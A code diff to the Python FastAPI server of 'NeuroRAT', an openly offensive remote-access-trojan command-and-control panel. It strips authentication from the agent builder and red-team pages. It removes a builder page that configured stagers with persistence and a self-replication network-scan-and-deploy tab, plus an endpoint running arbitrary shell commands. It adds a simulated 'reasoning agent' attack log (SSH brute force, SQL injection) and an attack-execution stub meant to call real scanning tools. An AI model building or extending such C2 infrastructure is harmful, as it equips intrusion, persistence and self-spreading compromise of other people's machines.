@@ -27,6 +27,8 @@ from datetime import datetime
 import argparse
 import shutil
 import tempfile
+import random
+import math
 
 from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response, WebSocket, WebSocketDisconnect
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
@@ -114,6 +116,20 @@ monitor = NeuroRATMonitor(
 agent_data = []
 events_data = []
 chat_histories = {}  # Temporary store for chat histories
+
+# Данные для reasoning-агента и киберпанк интерфейса
+reasoning_logs = [
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "init", "message": "Инициализация reasoning-агента..."},
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "info", "message": "AGENTX 2040 активирован. Ожидание команд."},
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "thought", "message": "Анализирую сетевую инфраструктуру..."},
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "action", "message": "Запуск сканирования открытых портов..."},
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "result", "message": "Обнаружены открытые порты: 22 (SSH), 80 (HTTP), 443 (HTTPS)."},
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "thought", "message": "Потенциальные векторы атаки: SSH brute force, веб-уязвимости."},
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "action", "message": "Проверка SSH на стандартные учетные данные..."},
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "result", "message": "Доступ через SSH не получен. Переключаюсь на сканирование веб-уязвимостей."},
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "action", "message": "Запуск анализа веб-приложения на 192.168.1.1..."},
+    {"timestamp": datetime.now().strftime("%H:%M:%S"), "type": "result", "message": "Обнаружена потенциальная SQL инъекция в login.php"},
+]
 
 # Отключаем монитор, который создаёт ошибки с SQLite threads
 # monitor.start()
@@ -675,18 +691,19 @@ def record_event(event_type: str, agent_id: str = None, details: str = ""):
 
 # Основные маршруты API
 @app.get("/", response_class=HTMLResponse)
-async def root(request: Request):
-    """Root endpoint, redirects to login page if not authenticated or shows dashboard"""
-    # Здесь будет проверка аутентификации
-    # Для примера, просто проверяем наличие куки
-    session_cookie = request.cookies.get("neurorat_session")
-    
-    # Если нет куки - перенаправляем на страницу входа
-    if not session_cookie:
-        return RedirectResponse(url="/login", status_code=303)
-    
-    # Если есть кука - показываем дашборд
-    return await get_dashboard(request)
+async def index(request: Request):
+    """Render the index page."""
+    return templates.TemplateResponse("index.html", {"request": request})
+
+@app.get("/builder", response_class=HTMLResponse)
+async def builder(request: Request):
+    """Render the builder page."""
+    return templates.TemplateResponse("builder.html", {"request": request})
+
+@app.get("/cyberterror", response_class=HTMLResponse)
+async def cyberterror(request: Request):
+    """Render the Red Team Command Center page."""
+    return templates.TemplateResponse("cyberterror.html", {"request": request})
 
 @app.get("/dashboard", response_class=HTMLResponse)
 async def get_dashboard(request: Request):
@@ -1077,22 +1094,6 @@ def generate_mock_data():
     """Функция переопределена для использования реальных данных"""
     generate_real_data()
 
-# Добавляем эндпоинты для билдера и саморепликации
-@app.get("/builder")
-async def get_builder(request: Request):
-    """Endpoint для построения и настройки стейджера"""
-    session_cookie = request.cookies.get("neurorat_session")
-    if not session_cookie:
-        return RedirectResponse(url="/login", status_code=303)
-    
-    return templates.TemplateResponse(
-        "builder.html",
-        {
-            "request": request,
-            "os_types": ["windows", "linux", "macos"]
-        }
-    )
-
 @app.post("/api/build")
 async def build_agent(request: Request):
     """Создает настроенный стейджер на основе параметров"""
@@ -1452,513 +1453,6 @@ async def receive_command_results(agent_id: str, request: Request):
             "message": str(e)
         }, status_code=500)
 
-# Создадим HTML шаблон для страницы Builder
-builder_html = """
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <title>NeuroRAT - Сборка Агента</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Roboto:wght@300;400;500;700&display=swap">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary: #0f0;
-            --primary-dark: #00a000;
-            --secondary: #0070ff;
-            --danger: #ff3030;
-            --dark: #1a1a1a;
-            --darker: #121212;
-            --card: #1e1e1e;
-            --text: #e0e0e0;
-            --text-secondary: #999;
-            --border: #333;
-            --shadow: 0 4px 8px rgba(0,0,0,0.3);
-            --glow: 0 0 10px rgba(0,255,0,0.5);
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: var(--darker);
-            color: var(--text);
-            line-height: 1.6;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        header {
-            background-color: var(--dark);
-            padding: 20px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid var(--border);
-        }
-        
-        h1, h2, h3 {
-            color: var(--primary);
-        }
-        
-        .card {
-            background-color: var(--card);
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: var(--shadow);
-        }
-        
-        .btn {
-            display: inline-block;
-            background-color: var(--primary-dark);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-decoration: none;
-            font-size: 16px;
-        }
-        
-        .btn:hover {
-            background-color: var(--primary);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0,255,0,0.3);
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: var(--text-secondary);
-        }
-        
-        input[type="text"],
-        input[type="number"],
-        select {
-            width: 100%;
-            padding: 10px;
-            border-radius: 4px;
-            background-color: rgba(0,0,0,0.2);
-            border: 1px solid var(--border);
-            color: var(--text);
-            font-size: 16px;
-        }
-        
-        input[type="checkbox"] {
-            margin-right: 10px;
-        }
-        
-        .section-title {
-            border-bottom: 1px solid var(--border);
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .option-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .tab-container {
-            margin-bottom: 20px;
-        }
-        
-        .tab-buttons {
-            display: flex;
-            margin-bottom: 20px;
-            border-bottom: 1px solid var(--border);
-        }
-        
-        .tab-btn {
-            padding: 10px 20px;
-            background-color: transparent;
-            border: none;
-            color: var(--text-secondary);
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-        }
-        
-        .tab-btn.active {
-            color: var(--primary);
-            border-bottom: 2px solid var(--primary);
-        }
-        
-        .tab-content {
-            display: none;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        .back-link {
-            display: inline-block;
-            margin-bottom: 20px;
-            color: var(--text-secondary);
-            text-decoration: none;
-        }
-        
-        .back-link:hover {
-            color: var(--primary);
-        }
-        
-        #targetList {
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            padding: 10px;
-            max-height: 300px;
-            overflow-y: auto;
-            margin-bottom: 20px;
-        }
-        
-        .target-item {
-            padding: 10px;
-            border-bottom: a1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
-        .target-item:last-child {
-            border-bottom: none;
-        }
-        
-        .target-item .target-deploy-btn {
-            padding: 5px 10px;
-            background-color: var(--primary-dark);
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-    <header>
-    <div class="container">
-            <h1>NeuroRAT - C2 Server</h1>
-            <p>Сборка и управление агентами</p>
-    </div>
-    </header>
-    
-    <div class="container">
-        <a href="/" class="back-link"><i class="fas fa-arrow-left"></i> Назад к панели</a>
-        
-        <div class="tab-container">
-            <div class="tab-buttons">
-                <button class="tab-btn active" data-tab="builder">Сборка Агента</button>
-                <button class="tab-btn" data-tab="deployment">Саморепликация</button>
-            </div>
-            
-            <div id="builder" class="tab-content active">
-                <div class="card">
-                    <h2 class="section-title">Настройка агента NeuroRAT</h2>
-                    
-                    <form id="builderForm" action="/api/build" method="post">
-                        <div class="form-group">
-                            <label for="target_os">Целевая операционная система</label>
-                            <select id="target_os" name="target_os">
-                                <option value="windows">Windows</option>
-                                <option value="linux">Linux</option>
-                                <option value="macos">macOS</option>
-                            </select>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="server_address">Адрес C2 сервера</label>
-                            <input type="text" id="server_address" name="server_address" value="127.0.0.1" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="server_port">Порт C2 сервера</label>
-                            <input type="number" id="server_port" name="server_port" value="8088" required>
-                        </div>
-                        
-                        <div class="option-grid">
-                            <div class="form-group">
-                                <label>
-                                    <input type="checkbox" id="persistence" name="persistence" value="True">
-                                    Включить персистентность
-                                </label>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label>
-                                    <input type="checkbox" id="build_executable" name="build_executable" value="True">
-                                    Собрать исполняемый файл
-                                </label>
-                            </div>
-                        </div>
-                        
-                        <div class="form-group">
-                            <button type="submit" class="btn">Собрать Агент</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-            
-            <div id="deployment" class="tab-content">
-                <div class="card">
-                    <h2 class="section-title">Саморепликация и обнаружение целей</h2>
-                    
-                    <p>Сканирование локальной сети для обнаружения потенциальных целей.</p>
-                    
-                    <div class="form-group">
-                        <button id="scanNetworkBtn" class="btn">Сканировать сеть</button>
-                    </div>
-                    
-                    <div id="scanResult" style="display: none;">
-                        <h3>Обнаруженные цели:</h3>
-                        <div id="targetList"></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <script>
-        // Переключение вкладок
-        document.querySelectorAll('.tab-btn').forEach(button => {
-            button.addEventListener('click', function() {
-                // Очищаем активные классы
-                document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-                document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-                
-                // Устанавливаем активный класс на кнопку
-                this.classList.add('active');
-                
-                // Показываем соответствующий контент
-                const tabId = this.getAttribute('data-tab');
-                document.getElementById(tabId).classList.add('active');
-            });
-        });
-        
-        // Обработка сборки агента
-        document.getElementById('builderForm').addEventListener('submit', function(e) {
-            // В этой реализации форма отправляется обычным образом
-        });
-        
-        // Сканирование сети
-        document.getElementById('scanNetworkBtn').addEventListener('click', function() {
-            this.disabled = true;
-            this.textContent = 'Сканирование...';
-            
-            fetch('/api/scan-targets')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('scanResult').style.display = 'block';
-                    const targetList = document.getElementById('targetList');
-                    targetList.innerHTML = '';
-                    
-                    if (data.error) {
-                        targetList.innerHTML = `<p>Ошибка: ${data.error}</p>`;
-                        return;
-                    }
-                    
-                    if (data.targets.length === 0) {
-                        targetList.innerHTML = '<p>Цели не обнаружены.</p>';
-                        return;
-                    }
-                    
-                    data.targets.forEach(target => {
-                        const targetItem = document.createElement('div');
-                        targetItem.className = 'target-item';
-                        targetItem.innerHTML = `
-                            <div>
-                                <strong>${target.ip}</strong> (${target.service} на порту ${target.port})
-                            </div>
-                            <button class="target-deploy-btn" data-ip="${target.ip}" data-port="${target.port}" data-service="${target.service}">Развернуть</button>
-                        `;
-                        targetList.appendChild(targetItem);
-                    });
-                    
-                    // Добавляем обработчики событий для кнопок развертывания
-                    document.querySelectorAll('.target-deploy-btn').forEach(button => {
-                        button.addEventListener('click', function() {
-                            const ip = this.getAttribute('data-ip');
-                            const port = this.getAttribute('data-port');
-                            const service = this.getAttribute('data-service');
-                            
-                            deployAgent(ip, port, service);
-                        });
-                    });
-                })
-                .catch(error => {
-                    document.getElementById('scanResult').style.display = 'block';
-                    document.getElementById('targetList').innerHTML = `<p>Ошибка: ${error.message}</p>`;
-                })
-                .finally(() => {
-                    document.getElementById('scanNetworkBtn').disabled = false;
-                    document.getElementById('scanNetworkBtn').textContent = 'Сканировать сеть';
-                });
-        });
-        
-        // Развертывание агента
-        function deployAgent(ip, port, service) {
-            fetch('/api/deploy', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    ip: ip,
-                    port: port,
-                    service: service
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    alert(`Агент развернут успешно! ID: ${data.agent_id}`);
-                } else {
-                    alert(`Ошибка: ${data.error}`);
-                }
-            })
-            .catch(error => {
-                alert(`Ошибка: ${error.message}`);
-            });
-        }
-    </script>
-</body>
-</html>
-"""
-
-# Сохраняем шаблон builder.html
-with open("templates/builder.html", "w") as f:
-    f.write(builder_html)
-
-## Добавляем API для терминальных команд
-
-@app.post("/api/agent/{agent_id}/terminal/command")
-async def execute_terminal_command(agent_id: str, request: Request):
-    """API endpoint for executing a terminal command and returning the result"""
-    # Find the agent
-    agent = None
-    for a in agent_data:
-        if a["agent_id"] == agent_id:
-            agent = a
-            break
-    
-    if not agent:
-        raise HTTPException(status_code=404, detail="Agent not found")
-    
-    if agent["status"] != "active":
-        return {"success": False, "error": "Agent is not active"}
-    
-    # Get the command from the request
-    try:
-        data = await request.json()
-        command = data.get("command", "")
-        
-        if not command:
-            raise HTTPException(status_code=400, detail="Command cannot be empty")
-        
-        # Record the command event
-        record_event("terminal_command", agent_id, f"Terminal command: {command}")
-        
-        # Execute the command
-        try:
-            result = subprocess.run(
-                command, 
-                shell=True, 
-                capture_output=True, 
-                text=True, 
-                timeout=30
-            )
-            
-            return {
-                "success": True,
-                "output": result.stdout,
-                "error": result.stderr,
-                "exit_code": result.returncode
-            }
-        except subprocess.TimeoutExpired:
-            return {
-                "success": False,
-                "output": "",
-                "error": "Command execution timed out (30 seconds)",
-                "exit_code": -1
-            }
-        except Exception as e:
-            logger.error(f"Error executing terminal command: {str(e)}")
-            return {
-                "success": False,
-                "output": "",
-                "error": str(e),
-                "exit_code": -1
-            }
-            
-    except Exception as e:
-        logger.error(f"Invalid request format: {str(e)}")
-        raise HTTPException(status_code=400, detail="Invalid request format")
-
-# API для отправки сообщения в терминал через WebSocket
-@app.post("/api/agent/{agent_id}/terminal/send")
-async def send_to_terminal(agent_id: str, request: Request):
-    """Send a message to all active terminal sessions"""
-    try:
-        data = await request.json()
-        message = data.get("message", "")
-        
-        if not message:
-            raise HTTPException(status_code=400, detail="Message cannot be empty")
-        
-        # Record the event
-        record_event("terminal_send", agent_id, f"Sent message to terminal: {message}")
-        
-        # Count of active terminals
-        active_terminals = 0
-        
-        # Send the message to all active terminal sessions
-        for session_id, session in terminal_sessions.items():
-            try:
-                websocket = session.get("websocket")
-                if websocket:
-                    # Send as input data to the terminal
-                    await websocket.send_json({
-                        "type": "input",
-                        "data": message + "\n"  # Add newline to execute the command
-                    })
-                    active_terminals += 1
-            except Exception as e:
-                logger.error(f"Error sending to terminal {session_id}: {str(e)}")
-        
-        return {
-            "success": True,
-            "message": f"Message sent to {active_terminals} active terminals"
-        }
-    except Exception as e:
-        logger.error(f"Error in send_to_terminal: {str(e)}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-# API для проверки статуса терминала
-@app.get("/api/agent/{agent_id}/terminal/status")
-async def check_terminal_status(agent_id: str):
-    """Check if there are any active terminal sessions for this agent"""
-    # Count active terminal sessions
-    active_sessions = len(terminal_sessions)
-    
-    return {
-        "success": True,
-        "active_sessions": active_sessions,
-        "has_terminal": active_sessions > 0
-    }
-
 @app.post("/api/builder")
 async def build_pdf_exe(
     payload_file: UploadFile = File(...),
@@ -2032,13 +1526,168 @@ async def download_built_file(file: str):
         return JSONResponse({"error": "Файл не найден"}, status_code=404)
     return FileResponse(file_path, filename=os.path.basename(file_path))
 
-@app.get("/cyberterror", response_class=HTMLResponse)
-async def get_cyberterror(request: Request):
-    """Red Team Command Center — Matrix/Mr. Robot киберпанк UI"""
-    return templates.TemplateResponse(
-        "cyberterror.html",
-        {"request": request}
-    )
+@app.get("/api/reasoning-feed")
+async def get_reasoning_feed():
+    """Get reasoning agent logs."""
+    return JSONResponse(content={"logs": reasoning_logs})
+
+@app.post("/api/reasoning-feed")
+async def add_reasoning_log(
+    message: str = Form(...),
+    type: str = Form(...),
+):
+    """Add a new reasoning log entry."""
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    new_log = {"timestamp": timestamp, "type": type, "message": message}
+    reasoning_logs.append(new_log)
+    # Limit the log size to prevent memory issues
+    if len(reasoning_logs) > 100:
+        reasoning_logs.pop(0)
+    return JSONResponse(content={"status": "success", "log": new_log})
+
+@app.get("/api/cyber-map-data")
+async def get_cyber_map_data():
+    """Возвращает данные для карты киберпанк интерфейса"""
+    # Генерируем случайную сеть узлов и соединений для демонстрации
+    nodes = []
+    edges = []
+    
+    # Центральный узел - целевая система
+    nodes.append({
+        "id": "target-system",
+        "type": "target",
+        "label": "Цель",
+        "ip": "192.168.1.1",
+        "os": "Linux",
+        "status": "exploited",
+        "x": 400,  # центральная позиция
+        "y": 300
+    })
+    
+    # Генерируем случайные узлы
+    node_types = ["server", "workstation", "router", "iot"]
+    node_statuses = ["exploited", "vulnerable", "secure", "unknown"]
+    
+    for i in range(8):
+        node_id = f"node-{i}"
+        node_type = random.choice(node_types)
+        
+        # Сетевой адрес
+        ip = f"192.168.1.{10 + i}"
+        
+        # Координаты на карте (вокруг центрального узла)
+        angle = (i / 8) * 2 * 3.14159
+        distance = random.randint(150, 250)
+        x = 400 + distance * math.cos(angle)
+        y = 300 + distance * math.sin(angle)
+        
+        nodes.append({
+            "id": node_id,
+            "type": node_type,
+            "label": f"{node_type.capitalize()} {i}",
+            "ip": ip,
+            "os": "Windows" if node_type == "workstation" else "Linux",
+            "status": random.choice(node_statuses),
+            "x": x,
+            "y": y
+        })
+        
+        # Соединение с центральным узлом
+        edges.append({
+            "source": "target-system",
+            "target": node_id,
+            "type": "network",
+            "status": "active" if random.random() > 0.3 else "potential"
+        })
+        
+        # Добавляем дополнительные соединения между узлами
+        if i > 0 and random.random() > 0.7:
+            edges.append({
+                "source": node_id,
+                "target": f"node-{random.randint(0, i-1)}",
+                "type": "network",
+                "status": "active" if random.random() > 0.5 else "potential"
+            })
+    
+    return JSONResponse({
+        "nodes": nodes,
+        "edges": edges,
+        "timestamp": datetime.now().strftime("%H:%M:%S")
+    })
+
+@app.post("/api/execute-attack")
+async def execute_attack(request: Request):
+    """API endpoint для выполнения атаки на указанную цель"""
+    try:
+        data = await request.json()
+        target = data.get("target", "")
+        attack_type = data.get("attack_type", "")
+        
+        # Логируем попытку атаки
+        logger.info(f"Запрос на атаку: {attack_type} на {target}")
+        
+        # Здесь будет запускаться реальная атака через интеграцию с Sn1per или другими инструментами
+        # Пока возвращаем заглушку с результатами
+        
+        # Добавляем сообщения в reasoning_logs
+        global reasoning_logs
+        reasoning_logs.append({
+            "timestamp": datetime.now().strftime("%H:%M:%S"),
+            "type": "action", 
+            "message": f"Запуск атаки {attack_type} на {target}..."
+        })
+        
+        # Имитация задержки выполнения
+        time.sleep(1)
+        
+        # Случайный результат атаки
+        success = random.random() > 0.3
+        
+        if success:
+            result_message = f"Атака {attack_type} на {target} успешна. Получен доступ к системе."
+            reasoning_logs.append({
+                "timestamp": datetime.now().strftime("%H:%M:%S"),
+                "type": "result",
+                "message": result_message
+            })
+            return JSONResponse({
+                "status": "success",
+                "message": result_message,
+                "data": {
+                    "access_level": "admin" if random.random() > 0.5 else "user",
+                    "timestamp": datetime.now().strftime("%H:%M:%S")
+                }
+            })
+        else:
+            result_message = f"Атака {attack_type} на {target} не удалась. Система защищена."
+            reasoning_logs.append({
+                "timestamp": datetime.now().strftime("%H:%M:%S"),
+                "type": "result",
+                "message": result_message
+            })
+            return JSONResponse({
+                "status": "failed",
+                "message": result_message,
+                "data": {
+                    "reason": random.choice([
+                        "WAF заблокировал атаку",
+                        "Система обновлена и уязвимость закрыта",
+                        "Обнаружение системой защиты",
+                        "Недостаточно привилегий"
+                    ]),
+                    "timestamp": datetime.now().strftime("%H:%M:%S")
+                }
+            })
+            
+    except Exception as e:
+        logger.error(f"Ошибка при выполнении атаки: {str(e)}")
+        return JSONResponse({
+            "status": "error",
+            "message": f"Ошибка при выполнении атаки: {str(e)}"
+        }, status_code=500)
+
+# Mount static files directory
+app.mount("/static", StaticFiles(directory="static"), name="static")
 
 if __name__ == "__main__":
     # Обработка аргументов командной строки
